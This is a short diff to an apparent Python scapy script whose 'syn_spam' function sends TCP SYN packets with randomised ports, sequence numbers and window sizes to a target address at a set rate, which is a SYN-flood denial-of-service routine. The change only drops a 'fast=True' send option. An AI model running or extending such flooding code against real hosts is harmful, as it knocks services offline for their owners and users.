@@ -18,7 +18,7 @@ def syn_spam(dst_ip, dst_port, pps):
         tcp = TCP(sport=random.randint(1024,65535), dport=dst_port,
                   seq=random.randint(0,2**32-1), flags='S',
                   window=random.randint(1024, 65535))
-        send(ip/tcp, iface=ARGS.iface, fast=True)
+        send(ip/tcp, iface=ARGS.iface)
         time.sleep(delay)
 
 if __name__ == '__main__':
